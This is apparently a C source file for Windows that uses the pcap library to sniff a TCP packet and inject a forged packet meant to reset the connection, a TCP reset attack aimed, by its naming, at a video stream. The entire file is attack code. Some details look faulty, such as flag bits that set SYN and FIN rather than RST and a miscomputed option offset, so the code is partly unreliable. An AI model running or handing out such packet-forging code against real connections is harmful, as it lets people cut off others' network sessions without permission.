#include<stdio.h>
#include<winsock2.h>
#include<windows.h>
#include<pcap.h>

#include "header_structure.h"
#include "sniff.h"
#include "raw_packet_constructor.h"
#define default_buffer_size 1500
void tcp_reset_attack(pcap_t *pt,char *src_ip,char *dest_ip,char *src_mac,char *dest_mac,u_short src_port,u_short dest_port,u_int seq){
    u_char buffer[1500];
    //构建一个mac头部
    struct ethheader *eth=(struct ethheader *)buffer;
    //构造一个ip头部
    struct ipheader *ip=(struct ipheader *)(buffer+sizeof(struct ethheader));
    u_char *ip_opt=(u_char *)(buffer+sizeof(struct ipheader));
    int ip_opt_len=0;
    //构造一个tcp头部
    struct tcpheader *tcp=(struct tcpheader *)(buffer+sizeof(struct ethheader)+sizeof(struct ipheader)+ip_opt_len);
    u_char *tcp_opt=(u_char *)(buffer+sizeof(struct ipheader)+ip_opt_len+sizeof(struct tcpheader));
    int tcp_opt_len=0;
    eth->ether_type=htons(0x0800);
    memcpy(eth->ether_shost,src_mac,6);
    memcpy(eth->ether_dhost,dest_mac,6);


    ip->iph_ver=4;
    ip->iph_ihl=5;
    ip->iph_ttl=128;
    ip->iph_protocol=6;
    ip->iph_len=htons(sizeof(struct ipheader)+ip_opt_len+sizeof(struct tcpheader)+tcp_opt_len);
    ip->iph_sourceip.s_addr=inet_addr(src_ip);
    ip->iph_destip.s_addr=inet_addr(dest_ip);

    tcp->th_sport=htons(src_port);
    tcp->th_dport=htons(dest_port);
    tcp->th_seq=htonl(seq);
    tcp->control_flags=3;
    tcp->Data_Offset=5;
    tcp->th_win=htons(8192);
    tcp->th_sum=0;
    htonipheader(ip);
    htontcpheader(tcp);
    calculate_tcp_cheksum(ip,tcp,tcp_opt,tcp_opt_len,NULL,0);

    pcap_sendpacket(pt,buffer,sizeof(struct ethheader)+sizeof(struct ipheader)+ip_opt_len+sizeof(struct tcpheader)+tcp_opt_len);
    pcap_close(pt);
}
void rst_video_stream(u_char param, const struct pcap_pkthdr *header, const u_char *pkt_data){
    got_pack(param,header,pkt_data);
    packet_args *param1=(packet_args *)param;
    tcp_packet *tcp_packet1=(tcp_packet *)(param1->packet_buffer);
    char err[PCAP_ERRBUF_SIZE];
    char *name="\\Device\\NPF_Loopback";
    pcap_t *pt =pcap_open_live(name, default_buffer_size, 1, 1000, err);
    tcp_reset_attack(pt,inet_ntoa(tcp_packet1->ip->iph_sourceip),inet_ntoa(tcp_packet1->ip->iph_destip),tcp_packet1->eth->ether_shost,tcp_packet1->eth->ether_dhost,ntohs(tcp_packet1->tcp->th_dport),ntohs(tcp_packet1->tcp->th_sport),ntohl(tcp_packet1->tcp->th_seq));

}